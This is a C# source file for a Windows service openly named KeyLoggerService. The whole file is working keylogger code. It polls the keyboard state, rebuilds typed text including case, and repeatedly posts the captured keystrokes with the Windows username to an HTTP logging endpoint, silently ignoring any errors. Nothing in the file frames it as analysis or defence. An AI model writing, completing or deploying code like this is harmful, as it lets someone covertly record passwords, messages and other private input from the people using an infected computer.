using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Http;
using System.Runtime.InteropServices;

namespace KeyLoggerService
{
    public partial class Service1 : ServiceBase
    {
        private Thread keyLogThread;
        private bool isRunning;
        private string buf = "";
        private readonly HttpClient client = new HttpClient();
        private readonly string apiUrl = "http://localhost:5058/log?username=" + Environment.UserName;

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        public Service1()
        {
            InitializeComponent();
            ServiceName = "KeyLoggerService";
        }

        protected override void OnStart(string[] args)
        {
            isRunning = true;
            keyLogThread = new Thread(KeyLoggerLoop)
            {
                IsBackground = true
            };
            keyLogThread.Start();
        }

        protected override void OnStop()
        {
            isRunning = false;
            if (keyLogThread != null)
            {
                keyLogThread.Join(5000);
            }
        }

        private void KeyLoggerLoop()
        {
            while (isRunning)
            {
                Thread.Sleep(100);

                bool shift = false;
                short shiftState = (short)GetAsyncKeyState(16);
                if ((shiftState & 0x8000) == 0x8000)
                {
                    shift = true;
                }
                var caps = Console.CapsLock;
                bool isBig = shift | caps;

                for (int i = 0; i < 255; i++)
                {
                    int state = GetAsyncKeyState(i);
                    if (state != 0)
                    {
                        if (((Keys)i) == Keys.Space) { buf += " "; continue; }
                        if (((Keys)i) == Keys.Enter) { buf += "\r\n"; continue; }

                        if (((Keys)i) == Keys.LButton || ((Keys)i) == Keys.RButton || ((Keys)i) == Keys.MButton) continue;

                        if (((Keys)i).ToString().Contains("Shift") || ((Keys)i) == Keys.Capital || ((Keys)i) == Keys.NumLock) continue;
                        if (((Keys)i) == Keys.LControlKey || ((Keys)i) == Keys.RControlKey) continue;
                        if (((Keys)i) == Keys.LMenu || ((Keys)i) == Keys.RMenu) continue;

                        if (((Keys)i).ToString().Contains("OemBackslash") || ((Keys)i).ToString().Contains("Scroll")) continue;
                        if (((Keys)i) == Keys.Escape || ((Keys)i) == Keys.Tab) continue;
                        if (((Keys)i) == Keys.Prior || ((Keys)i) == Keys.Next) continue;
                        if (((Keys)i) == Keys.Home || ((Keys)i) == Keys.End) continue;
                        if (((Keys)i) == Keys.Up || ((Keys)i) == Keys.Down || ((Keys)i) == Keys.Left || ((Keys)i) == Keys.Right) continue;
                        if (((Keys)i) == Keys.LWin || ((Keys)i) == Keys.RWin) continue;

                        if (((Keys)i).ToString().Length == 1)
                        {
                            char key = ((Keys)i).ToString()[0];
                            if (char.IsLetter(key) && isBig)
                            {
                                buf += char.ToUpper(key);
                            }
                            else if (char.IsLetter(key) && !isBig)
                            {
                                buf += char.ToLower(key);
                            }
                            else
                            {
                                buf += key;
                            }
                        }
                        else
                        {
                            buf += $"<{((Keys)i).ToString()}>";
                        }

                        if (buf.Length > 10)
                        {
                            _ = SendPayload(buf);
                            buf = "";
                        }
                    }
                }
            }
        }

        private async Task SendPayload(string payload)
        {
            try
            {
                var content = new StringContent(payload, Encoding.UTF8, "text/plain");
                await client.PostAsync(apiUrl, content);
            }
            catch (Exception)
            {
                // Silently ignore errors
            }
        }
    }
}
